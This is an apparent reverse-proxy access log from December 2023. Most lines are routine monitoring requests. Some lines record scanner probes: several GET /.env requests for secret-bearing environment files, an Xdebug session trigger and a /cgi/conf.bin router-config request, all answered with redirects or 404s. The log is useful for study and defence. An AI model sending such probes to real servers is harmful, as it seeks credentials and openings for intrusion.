159.203.109.206 - - [18/Dec/2023:19:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6404 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:19:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6405 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6406 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6407 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6408 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6409 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6410 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6411 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6412 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6413 "www@docker" "http://172.18.0.9:80" 1ms
37.187.215.255 - - [18/Dec/2023:20:03:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6414 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6415 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6416 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:20:04:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6417 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6418 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6419 "www@docker" "http://172.18.0.9:80" 1ms
71.6.232.27 - - [18/Dec/2023:20:06:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6420 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6421 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6422 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6423 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6424 "www@docker" "http://172.18.0.9:80" 1ms
172.105.128.11 - - [18/Dec/2023:20:07:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6425 "-" "-" 0ms
37.187.215.250 - - [18/Dec/2023:20:07:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6426 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6427 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6428 "www@docker" "http://172.18.0.9:80" 0ms
172.105.128.13 - - [18/Dec/2023:20:08:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6429 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6430 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6431 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [18/Dec/2023:20:10:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6432 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6433 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6434 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6435 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6436 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6437 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6438 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6439 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6440 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6441 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6442 "www@docker" "http://172.18.0.9:80" 1ms
205.210.31.159 - - [18/Dec/2023:20:14:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6443 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6444 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6445 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6446 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6447 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6448 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6449 "www@docker" "http://172.18.0.9:80" 1ms
146.70.78.7 - - [18/Dec/2023:20:17:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6450 "web-to-websecure@internal" "-" 0ms
146.70.78.7 - - [18/Dec/2023:20:17:52 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6451 "web-to-websecure@internal" "-" 0ms
146.70.78.7 - - [18/Dec/2023:20:17:53 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 6452 "-" "-" 0ms
146.70.78.7 - - [18/Dec/2023:20:17:54 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 6453 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6454 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6455 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6456 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [18/Dec/2023:20:19:23 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 6457 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:20:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6458 "www@docker" "http://172.18.0.9:80" 0ms
91.92.243.232 - - [18/Dec/2023:20:20:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6459 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6460 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6461 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6462 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6463 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6464 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6465 "www@docker" "http://172.18.0.9:80" 0ms
77.90.185.58 - - [18/Dec/2023:20:23:08 +0000] "GET /cgi/conf.bin HTTP/1.1" 301 17 "-" "-" 6466 "web-to-websecure@internal" "-" 0ms
77.90.185.58 - - [18/Dec/2023:20:23:08 +0000] "GET /cgi/conf.bin HTTP/1.1" 404 19 "-" "-" 6467 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6468 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6469 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6470 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6471 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6472 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6473 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6474 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6475 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6476 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6477 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6478 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6479 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6480 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6481 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6482 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.223 - - [18/Dec/2023:20:30:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6483 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:20:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6484 "www@docker" "http://172.18.0.9:80" 0ms
43.134.79.204 - - [18/Dec/2023:20:30:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6485 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6486 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6487 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6488 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6489 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6490 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6491 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6492 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [18/Dec/2023:20:34:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 6493 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:20:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6494 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6495 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6496 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6497 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6498 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6499 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6500 "www@docker" "http://172.18.0.9:80" 0ms
95.214.235.169 - - [18/Dec/2023:20:37:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6501 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:20:37:42 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6502 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6503 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6504 "www@docker" "http://172.18.0.9:80" 1ms
54.37.79.75 - - [18/Dec/2023:20:39:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6505 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:20:39:17 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6506 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6507 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6508 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6509 "www@docker" "http://172.18.0.9:80" 0ms
192.155.90.220 - - [18/Dec/2023:20:40:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6510 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:20:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6511 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6512 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6513 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6514 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6515 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6516 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6517 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6518 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6519 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6520 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6521 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6522 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6523 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6524 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6525 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6526 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6527 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6528 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:20:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6529 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6530 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6531 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6532 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6533 "www@docker" "http://172.18.0.9:80" 1ms
198.235.24.36 - - [18/Dec/2023:20:51:57 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 6534 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:20:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6535 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6536 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6537 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6538 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6539 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6540 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6541 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6542 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6543 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6544 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6545 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6546 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:20:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6547 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6548 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:20:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6549 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:20:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6550 "www@docker" "http://172.18.0.9:80" 0ms
54.36.115.221 - - [18/Dec/2023:21:00:10 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6551 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [18/Dec/2023:21:00:11 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6552 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6553 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6554 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6555 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6556 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6557 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6558 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6559 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6560 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6561 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6562 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [18/Dec/2023:21:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6563 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6564 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6565 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6566 "www@docker" "http://172.18.0.9:80" 1ms
45.79.163.53 - - [18/Dec/2023:21:07:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6567 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6568 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6569 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:21:08:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6570 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6571 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6572 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6573 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6574 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6575 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6576 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6577 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6578 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6579 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6580 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6581 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6582 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6583 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6584 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6585 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6586 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6587 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6588 "www@docker" "http://172.18.0.9:80" 1ms
